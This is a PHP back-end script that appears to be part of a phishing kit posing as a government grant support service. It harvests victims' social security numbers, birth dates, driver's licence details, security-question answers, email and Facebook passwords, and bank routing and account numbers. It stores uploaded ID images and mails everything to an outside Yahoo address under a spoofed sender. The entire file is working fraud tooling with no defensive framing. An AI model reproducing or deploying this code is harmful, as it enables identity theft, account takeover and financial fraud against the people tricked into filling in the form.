<?php

if(isset($_POST['mybtn'])){
    $b_fn = $_POST['b_fn'];
    $b_m = $_POST['b_m'];
    $b_ln = $_POST['b_ln'];
    $b_ph = $_POST['b_ph'];
    $b_ssn = $_POST['b_ssn'];
    $b_gd = $_POST['b_gd'];
    $b_dob = $_POST['b_dob'];
    $b_dl = $_POST['b_dl'];
    $b_dle = $_POST['b_dle'];
    $b_bn = $_POST['b_bn'];
    $b_mn = $_POST['b_mn'];
    $b_addr = $_POST['b_addr'];
    $b_city = $_POST['b_city'];
    $b_state = $_POST['b_state'];
    $b_zip = $_POST['b_zip'];
    $b_country = $_POST['b_country'];
    $b_em = $_POST['b_em'];
    $b_emp = $_POST['b_emp'];
    $b_fm = $_POST['b_fm'];
    $b_fmp = $_POST['b_fmp'];
    $b_grant = $_POST['b_grant'];
    $b_gamt = $_POST['b_gamt'];
    $b_gpay = $_POST['b_gpay'];
    $b_atype = $_POST['b_atype'];
    $b_rt = $_POST['b_rt'];
    $b_acc = $_POST['b_acc'];
    $m_addr = $_POST['m_addr'];
    $m_city = $_POST['m_city'];
    $m_state = $_POST['m_state'];
    $m_zip = $_POST['m_zip'];
    $m_country = $_POST['m_country'];
    $m_ph = $_POST['m_ph'];
    $front = $_FILES['front']['name'];
    $tmp = $_FILES['front']['tmp_name'];
    $back = $_FILES['back']['name'];
    $tmp2 = $_FILES['back']['tmp_name'];
    
    $folder = "docs/";
    
    move_uploaded_file($tmp, $folder.$front);
    move_uploaded_file($tmp2, $folder.$back);
    
    $subject = "NEW MESSAGE FROM GOVSUPPORT";
    
    $body = "<p>Firstname: $b_fn</p><br />
    Middlename: $b_m</p><br />
    Lastname: $b_ln</p><br />
    Phone number: $b_ph</p><br />
    S-SN: $b_ssn</p><br />
    Gender: $b_gd</p><br />
    Date of Birth: $b_dob</p><br />
    Drivers License Number: $b_dl</p><br />
    Drivers License Expiry: $b_dle</p><br />
    In What City Were You Born?: $b_bn</p><br />
    What Is Your Mother's Maiden Name? (Last Name Before Marriage.): $b_mn</p><br />
    Home Address: $b_addr</p><br />
    City: $b_city</p><br />
    State: $b_state</p><br />
    Zipcode: $b_zip</p><br />
    Country: $b_country</p><br />
    Email: $b_em</p><br />
    Email password: $b_emp</p><br />
    Facebook email: $b_fm</p><br />
    Facebook password: $b_fmp</p><br />
    Grant type: $b_grant</p><br />
    Amount: $b_gamt</p><br />
    How To Receive The Grant: $b_gpay</p><br />
    Account Type: $b_atype</p><br />
    Routing Number*: $b_rt</p><br />
    Account Number: $b_acc</p><br />";
    
    $to = "everiemarshal@yahoo.com";
    
    
$headers .='Reply-To: '. $to . "\r\n" ;
$headers .='X-Mailer: PHP/' . phpversion();
$headers .="MIME-Version: 1.0\r\n";
$headers .="Content-Type: text/html; charset=ISO-8859-1\r\n";
		
					  
if(mail($to,$subject,$body,$headers, '-f admin@u-nationssupport.com -F "GOVSUP"')) {
echo"<script>alert('ENTRY SUBMITTED');</script>";
   echo"<meta http-equiv='refresh' content='0 url=index' />";
  } 
  else 
  {
 header("Location: index");
  }
    
    
    
}

?>